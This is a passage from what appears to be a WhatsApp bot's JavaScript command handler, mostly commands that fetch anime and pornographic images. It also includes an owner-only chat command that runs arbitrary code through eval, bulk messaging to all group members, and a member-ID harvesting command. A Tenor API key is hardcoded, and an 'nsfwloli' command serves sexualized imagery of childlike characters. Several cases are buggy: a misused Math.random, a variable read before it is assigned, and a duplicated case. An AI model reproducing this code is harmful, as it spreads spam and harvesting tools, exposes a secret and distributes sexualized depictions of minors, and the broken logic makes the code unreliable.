            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/yuki.json"
            );
          if (/yulibocil/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/yulibocil.json"
            );
          if (/yumeko/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/yumeko.json"
            );
          let yeha = heyy[Math.floor(Math.random() * heyy.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: yeha }, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case ">":
      case "=>":
        if (!NhdTheCreator) return NhdStickOwner();
        var err = new TypeError();
        err.name = "EvalError ";
        err.message = "Code Not Found (404)";
        if (!q) return replygcnhd(util.format(err));
        var arg = command == ">" ? args.join(" ") : "return " + args.join(" ");
        try {
          var txtes = util.format(await eval(`(async()=>{ ${arg} })()`));
          replygcnhd(txtes);
        } catch (e) {
          let _syntax = "";
          let _err = util.format(e);
          let err = syntaxerror(arg, "EvalError", {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true,
            sourceType: "commonjs",
          });
          if (err) _syntax = err + "\n\n";
          replygcnhd(util.format(_syntax + _err));
        }
        break;
      case "pushcontact":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!m.isGroup) return replygcnhd(`The feature works only in grup`);
          if (!text) return replygcnhd(`text?`);
          let mem = await participants
            .filter((v) => v.id.endsWith(".net"))
            .map((v) => v.id);
          replygcnhd(`Success in pushing the message to contacts`);
          for (let pler of mem) {
            NhdBotFunc.sendMessage(pler, { text: q });
          }
          replygcnhd(`Done`);
        }
        break;
      case "pushcontactv2":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!q)
            return replygcnhd(
              `Incorrect Usage Please Use Command Like This\n${
                prefix + command
              } idgc|text`
            );
          await NhdStickWait();
          const metadata2 = await NhdBotFunc.groupMetadata(q.split("|")[0]);
          const halss = metadata2.participants;
          for (let mem of halss) {
            NhdBotFunc.sendMessage(
              `${mem.id.split("@")[0]}` + "@s.whatsapp.net",
              { text: q.split("|")[1] }
            );
            await sleep(5000);
          }
          replygcnhd(`Success`);
        }
        break;

      case "id":
        {
          replygcnhd(from);
        }
        break;
      case "userjid":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          const groupMetadata = m.isGroup
            ? await NhdBotFunc.groupMetadata(m.chat).catch((e) => {})
            : "";
          const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
          let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`;
          for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`;
          }
          replygcnhd(textt);
        }
        break;
      case "emojimix":
        {
          let [emoji1, emoji2] = text.split`+`;
          if (!emoji1) return replygcnhd(`Example : ${prefix + command} 😅+🤔`);
          if (!emoji2) return replygcnhd(`Example : ${prefix + command} 😅+🤔`);
          let anumojimix = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              emoji1
            )}_${encodeURIComponent(emoji2)}`
          );
          for (let res of anumojimix.results) {
            let encmedia = await NhdBotFunc.sendImageAsSticker(
              m.chat,
              res.url,
              m,
              {
                packname: global.packname,
                author: global.author,
                categories: res.tags,
              }
            );
          }
        }
        break;
      case "hentaivid2":
        {
          if (!m.isGroup) return NhdStickGroup();

          if (!AntiNsfw) return replygnhd(mess.nsfw);
          await NhdStickWait();
          sbe = await hentaivid();
          cejd = sbe[Math.floor(Math.random(), sbe.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            {
              video: { url: cejd.video_1 },
              caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`,
            },
            { quoted: m }
          );
        }
        break;
      case "hentaivid":
      case "hentaivideo":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!AntiNsfw) return replygcnhd(mess.nsfw);
          await NhdStickWait();
          const { hentai } = require("./lib/scraper.js");
          anu = await hentai();
          result912 = anu[Math.floor(Math.random(), anu.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            {
              video: { url: result912.video_1 },
              caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`,
            },
            { quoted: m }
          );
        }
        break;
      case "trap":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
      case "hentai-neko":
      case "hneko":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
      case "hentai-waifu":
      case "nwaifu":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
      case "gasm":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
      case "milf":
        if (!m.isGroup) return NhdStickGroup();
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/milf.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "animespank":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`);
        await NhdBotFunc.sendMessage(
          m.chat,
          { caption: `Here you go!`, image: { url: waifudd.data.url } },
          { quoted: m }
        ).catch((err) => {
          return "Error!";
        });
        break;
      case "ahegao":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/ahegao.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "ass":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/ass.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "bdsm":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/bdsm.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "blowjob":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/blowjob.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "cuckold":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/cuckold.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "cum":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/cum.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "eba":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/eba.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "ero":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/ero.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "femdom":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/femdom.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "foot":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/foot.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "gangbang":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/gangbang.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "glasses":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/glasses.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "hentai":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/hentai.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "jahy":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/jahy.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "manga":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/manga.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "masturbation":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/masturbation.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "neko-hentai":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/neko.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "neko-hentai2":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/neko2.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "nsfwloli":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/nsfwloli.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "orgy":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/orgy.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "panties":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/panties.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "pussy":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/pussy.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "tentacles":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/tentacles.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "thighs":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/thighs.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "yuri":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/yuri.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "zettai":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/zettai.json")
        );
        var nhdyresult = pickRandom(ahegaonsfw);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: nhdyresult.url } },
          { quoted: m }
        );
        break;
      case "gifblowjob":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        let assss = await axios.get("https://api.waifu.pics/nsfw/blowjob");
        var bobuff = await fetchBuffer(assss.data.url);
        var bogif = await buffergif(bobuff);
        await NhdBotFunc.sendMessage(
          m.chat,
          { video: bogif, gifPlayback: true },
          { quoted: m }
        ).catch((err) => {});
        break;
      case "gifhentai":
        if (!m.isGroup) return NhdStickGroup();
        if (!AntiNsfw) return replygcnhd(mess.nsfw);
        await NhdStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./HostMedia/nsfw/gifs.json")
        );
        var nhdyresultx = pickRandom(ahegaonsfw);
        await NhdBotFunc.sendMessage(
          m.chat,
          { video: nhdyresultx, gifPlayback: true },
          { quoted: m }
        ).catch((err) => {});
        break;
      case "gifs":
      case "foot":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!AntiNsfw) return replygcnhd(mess.nsfw);
          await NhdStickWait();
          let heyy;
          let yeha = heyy[Math.floor(Math.random() * heyy.length)];
          if (/gifs/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/gifs.json"
            );
          if (/foot/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/foot.json"
            );
          NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: yeha }, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "animeawoo":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animemegumin":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeshinobu":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehandhold":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehighfive":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecringe":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animedance":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehappy":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeglomp":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animesmug":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeblush":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewave":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animesmile":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animepoke":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewink":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebonk":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebully":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeyeet":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebite":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animelick":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animekill":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecry":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewlp":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animekiss":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehug":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeneko":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animepat":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeslap":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecuddle":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewaifu":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animenom":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animefoxgirl":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animetickle":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animegecg":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "dogwoof":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "8ballpool":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
